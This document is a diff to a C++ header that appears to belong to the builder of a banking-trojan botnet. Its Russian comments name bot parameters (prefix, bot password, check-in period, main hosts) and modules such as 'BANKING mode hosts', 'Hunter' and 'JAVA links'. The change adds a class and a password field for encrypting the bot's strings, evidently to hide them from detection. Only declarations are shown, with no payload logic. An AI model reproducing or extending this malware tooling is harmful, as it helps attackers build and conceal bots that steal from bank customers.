@@ -44,6 +44,8 @@ namespace Builder
 }
 
 
+
+
 PCHAR Module_BankHosts     = "Хосты режима BANKING";
 PCHAR Module_Hunter        = "Hunter";
 PCHAR Module_JavaConfig    = "Ссылки JAVA";
@@ -65,6 +67,7 @@ class TBotBuilder;
 class TBotModule;
 class TBotParam;
 class TBotModuleEdit;
+class TBotStringsEncryptor;
 
 
 
@@ -86,10 +89,12 @@ private:
 	TCollection* FModules;
 	TList*       FActiveModules;
 	TMemoryStream* FFile;   // Загруженный файл
+	TBotParam* FStringsPassword; // Пароль шифрования строк
 	TBotParam* FPrefix;     // Префикс бота
 	TBotParam* FPassword;   // Пароль бота
 	TBotParam* FDelay;      // Период отстука
 	TBotParam* FHosts;      // Основные хосты
+	TBotStringsEncryptor *FStringsEncryptor; // Объяект шифрования строк бота
 	TBuilderMessage FOnMessage;
 	friend class TBotModule;
 	friend class TBotParam;
@@ -136,7 +141,7 @@ public:
 	__property TBotParam* Password = {read = FPassword};
 	__property TBotParam* Delay    = {read = FDelay};
 	__property TBotParam* Hosts    = {read = FHosts};
-	__property int        Count = {read = GetCount};
+	__property int        Count    = {read = GetCount};
 	__property TBotParam* Params[int Index] = {read = GetParam};
 	// События
     __property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
@@ -187,7 +192,7 @@ public:
 	void __fastcall Clear();
 	void __fastcall SetValue(PCHAR Value, DWORD ValueSize);
     int  __fastcall Position(PCHAR Buf, DWORD BufSize);
-	TBotParamStatus __fastcall Status();
+	TBotParamStatus __fastcall virtual Status();
 
 	void __fastcall SaveToStream(TStream *Stream);
 	void __fastcall LoadFromStream(TStream *Stream);
@@ -272,6 +277,17 @@ class TBotModuleEdit
 public:
 	bool __fastcall virtual Execute(TBotModule *Module) = 0;
 };
+
+//*************************************************************
+//   TBotStringsEncryptor  - Класс шифрования строк бота
+//*************************************************************
+class TBotStringsEncryptor : public TComponent
+{
+public:
+	__fastcall TBotStringsEncryptor(TComponent *Owner);
+	bool Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password);
+};
+
 
 
 //---------------------------------------------------------------------------
